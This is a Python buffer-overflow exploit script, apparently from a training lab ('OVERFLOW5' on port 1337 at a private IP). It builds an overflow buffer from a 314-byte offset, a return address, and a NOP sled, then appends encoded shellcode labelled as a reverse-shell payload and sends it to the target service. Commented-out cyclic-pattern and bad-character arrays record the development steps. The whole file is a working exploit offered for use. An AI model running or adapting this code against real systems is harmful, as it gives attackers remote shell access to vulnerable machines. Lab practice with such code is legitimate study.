import socket

ip = "10.10.99.178"
port = 1337

prefix = "OVERFLOW5 "
# offset = 0
offset = 314

overflow = "A" * offset

retn = "\xaf\x11Pb"

# padding = ""
padding = "\x90" * 16

# origial payload
# payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

# Bytearray
# payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# modified payload:
# payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff"

# RevShell Payload
payload = ("\xfc\xbb\xc1\xee\x25\xd6\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x3d\x06\xa7"
"\xd6\xbd\xd7\xc8\x5f\x58\xe6\xc8\x04\x29\x59\xf9\x4f\x7f"
"\x56\x72\x1d\x6b\xed\xf6\x8a\x9c\x46\xbc\xec\x93\x57\xed"
"\xcd\xb2\xdb\xec\x01\x14\xe5\x3e\x54\x55\x22\x22\x95\x07"
"\xfb\x28\x08\xb7\x88\x65\x91\x3c\xc2\x68\x91\xa1\x93\x8b"
"\xb0\x74\xaf\xd5\x12\x77\x7c\x6e\x1b\x6f\x61\x4b\xd5\x04"
"\x51\x27\xe4\xcc\xab\xc8\x4b\x31\x04\x3b\x95\x76\xa3\xa4"
"\xe0\x8e\xd7\x59\xf3\x55\xa5\x85\x76\x4d\x0d\x4d\x20\xa9"
"\xaf\x82\xb7\x3a\xa3\x6f\xb3\x64\xa0\x6e\x10\x1f\xdc\xfb"
"\x97\xcf\x54\xbf\xb3\xcb\x3d\x1b\xdd\x4a\x98\xca\xe2\x8c"
"\x43\xb2\x46\xc7\x6e\xa7\xfa\x8a\xe6\x04\x37\x34\xf7\x02"
"\x40\x47\xc5\x8d\xfa\xcf\x65\x45\x25\x08\x89\x7c\x91\x86"
"\x74\x7f\xe2\x8f\xb2\x2b\xb2\xa7\x13\x54\x59\x37\x9b\x81"
"\xce\x67\x33\x7a\xaf\xd7\xf3\x2a\x47\x3d\xfc\x15\x77\x3e"
"\xd6\x3d\x12\xc5\xb1\x4b\xeb\xc3\xe2\x24\xe9\xcb\xc6\x0c"
"\x64\x2d\x6c\x7d\x21\xe6\x19\xe4\x68\x7c\xbb\xe9\xa6\xf9"
"\xfb\x62\x45\xfe\xb2\x82\x20\xec\x23\x63\x7f\x4e\xe5\x7c"
"\x55\xe6\x69\xee\x32\xf6\xe4\x13\xed\xa1\xa1\xe2\xe4\x27"
"\x5c\x5c\x5f\x55\x9d\x38\x98\xdd\x7a\xf9\x27\xdc\x0f\x45"
"\x0c\xce\xc9\x46\x08\xba\x85\x10\xc6\x14\x60\xcb\xa8\xce"
"\x3a\xa0\x62\x86\xbb\x8a\xb4\xd0\xc3\xc6\x42\x3c\x75\xbf"
"\x12\x43\xba\x57\x93\x3c\xa6\xc7\x5c\x97\x62\xe7\xbe\x3d"
"\x9f\x80\x66\xd4\x22\xcd\x98\x03\x60\xe8\x1a\xa1\x19\x0f"
"\x02\xc0\x1c\x4b\x84\x39\x6d\xc4\x61\x3d\xc2\xe5\xa3\x3d"
"\xe4\x19\x4c")

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")